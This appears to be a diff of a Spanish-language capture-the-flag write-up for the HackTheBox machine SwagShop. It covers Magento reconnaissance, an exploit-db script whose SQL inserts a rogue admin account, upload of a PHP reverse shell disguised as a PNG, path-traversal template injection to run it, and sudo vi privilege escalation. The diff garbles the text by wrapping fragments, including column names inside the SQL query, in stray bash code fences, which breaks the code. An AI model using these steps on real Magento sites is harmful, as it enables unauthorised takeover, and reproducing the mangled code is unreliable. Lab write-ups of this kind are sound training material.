@@ -60,7 +60,11 @@ whatweb http://10.10.10.140
 
 Vemos que estamos en frente de una maquina Linux servido por un Apache 2.4.18 con un dominio **swagshop.htb**.
 Vemos que hay un error porque la pagina nos redirige automaticamente al dominio y da un error.
-Añadimos el dominio a nuestro `/etc/hosts` y volmemos a lanzar el whatweb.
+Añadimos el dominio a nuestro 
+```bash
+ /etc/hosts 
+```
+ y volmemos a lanzar el whatweb.
 
 Ahora vemos que estamos en frente de un Magento.
 
@@ -69,7 +73,11 @@ Ahora vemos que estamos en frente de un Magento.
 Con firefox navigamos en la web para ver lo que es. Vemos una web donde se puede comprar productos. Vemos que hay
 un panel de busqueda. Intentamos ver si es vulnerable a un html injeccion o un XSS pero no es el caso.
 
-Nos damos cuenta que la URL es `http://swagshop.htb/index.php/`. La ultima bara nos hace pensar que puede ser un directorio.
+Nos damos cuenta que la URL es 
+```bash
+ http://swagshop.htb/index.php/ 
+```
+. La ultima bara nos hace pensar que puede ser un directorio.
 Vamos a fuzzear la web.
 
 #### Fuzzing con WFuzz {-}
@@ -86,7 +94,11 @@ Encontramos unas rutas:
 - contacts
 - home
 
-Miramos lo que hay en la routa `http://10.10.10.140/index.php/admin`
+Miramos lo que hay en la routa 
+```bash
+ http://10.10.10.140/index.php/admin 
+```
+
 
 Checkeamos en la web si existen credenciales por defecto para Magento pero no funcciona. Miramos si existe algo interesante en **exploit-db**
 
@@ -129,8 +141,64 @@ q="""
 SET @SALT = 'rp';
 SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
 SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
-INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
-INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+INSERT INTO 
+```bash
+ admin_user 
+```
+ (
+```bash
+ firstname 
+```
+, 
+```bash
+ lastname 
+```
+,
+```bash
+ email 
+```
+,
+```bash
+ username 
+```
+,
+```bash
+ password 
+```
+,
+```bash
+ created 
+```
+,
+```bash
+ lognum 
+```
+,
+```bash
+ reload_acl_flag 
+```
+,
+```bash
+ is_active 
+```
+,
+```bash
+ extra 
+```
+,
+```bash
+ rp_token 
+```
+,
+```bash
+ rp_token_created_at 
+```
+) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO 
+```bash
+ admin_role 
+```
+ (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
 """
 
 
@@ -149,7 +217,11 @@ else:
     print "DID NOT WORK"
 ```
 
-Lanzamos el script con el commando `python3 magento_rce.py` y nos dice que el script a funccionado y a creado un usuario forme con la contraseña forme.
+Lanzamos el script con el commando 
+```bash
+ python3 magento_rce.py 
+```
+ y nos dice que el script a funccionado y a creado un usuario forme con la contraseña forme.
 
 Lo miramos desde la web y entramos en Admin panel de Magento.
 ## Vuln exploit & Gaining Access {-}
@@ -166,12 +238,32 @@ nc -nlvp 443
 
 Desde el panel de configuration de Magento
 
-1. Vamos al menu `System -> Configuration`.
-1. En el Menu de izquierda vamos a `ADVANCED -> Developer`
-1. En Template Settings Habilitamos los Symlinks y damos al boton `Save Config`
-1. En el menu principal, le damos a `catalog -> Manage Categories`
+1. Vamos al menu 
+```bash
+ System -> Configuration 
+```
+.
+1. En el Menu de izquierda vamos a 
+```bash
+ ADVANCED -> Developer 
+```
 
-Aqui tenemos que crear una reverse shell `vi shell.php.png`
+1. En Template Settings Habilitamos los Symlinks y damos al boton 
+```bash
+ Save Config 
+```
+
+1. En el menu principal, le damos a 
+```bash
+ catalog -> Manage Categories 
+```
+
+
+Aqui tenemos que crear una reverse shell 
+```bash
+ vi shell.php.png 
+```
+
 
 ```php
 <?php
@@ -182,22 +274,50 @@ Aqui tenemos que crear una reverse shell `vi shell.php.png`
 De esta manera, la podemos subir al magento en la parte **Image**, en Name ponemos **test** y damos al boton Save Category
 Si hacemos hovering por encima del link de la imagen vemos la routa siguiente
 
-`http://swagshop.htb/media/catalog/category/shell.php.png`
+
+```bash
+ http://swagshop.htb/media/catalog/category/shell.php.png 
+```
+
 
 Aqui creamos un nuevo Newsletter Template.
 
-1. En el menu Pricipal damos a `Newsletter -> Newsletter Templates`
+1. En el menu Pricipal damos a 
+```bash
+ Newsletter -> Newsletter Templates 
+```
+
 1. damos al boton Add Newsletter Template
 1. En el formulario le ponemos
 
-    - Template Name: `Test`
-    - Template Subject: `Test`
-    - Template Content: `{{block type="core/template" template="../media/catalog/category/shell.php.png"}}`
+    - Template Name: 
+```bash
+ Test 
+```
+
+    - Template Subject: 
+```bash
+ Test 
+```
+
+    - Template Content: 
+```bash
+ {{block type="core/template" template="../media/catalog/category/shell.php.png"}} 
+```
+
 
 1. le damos al boton Save Template, pinchamos al template creado y le damos a preview template
 
-Aqui no passa nada, lo que quiere decir que la profundida del path traversal no es buena. Intentamos con 2 `../../media` hasta llegar
-a la buena profundidad que seria `../../../../../../media/catalog/category/shell.php.png` y hemos ganado acceso a la maquina victima.
+Aqui no passa nada, lo que quiere decir que la profundida del path traversal no es buena. Intentamos con 2 
+```bash
+ ../../media 
+```
+ hasta llegar
+a la buena profundidad que seria 
+```bash
+ ../../../../../../media/catalog/category/shell.php.png 
+```
+ y hemos ganado acceso a la maquina victima.
 
 ### Tratamiento de la TTY {-}
 
@@ -215,7 +335,11 @@ stty -a
 stty rows <rownb> columns <colnb>
 ```
 
-Dandole a `cd /home` vemos que hay un usuario haris que contiene el **user.txt** y podemos ver la flag## Privilege Escalation {-}
+Dandole a 
+```bash
+ cd /home 
+```
+ vemos que hay un usuario haris que contiene el **user.txt** y podemos ver la flag## Privilege Escalation {-}
 
 ### Rootear la maquina {-}
 
@@ -226,7 +350,11 @@ id
 sudo -l
 ```
 
-Vemos que podemos lanzar `/usr/bin/vi` como root sin proporcionar contraseña.
+Vemos que podemos lanzar 
+```bash
+ /usr/bin/vi 
+```
+ como root sin proporcionar contraseña.
 
 Como con vi se puede settear nuevas variables, es muy facil rootear esta maquina
 
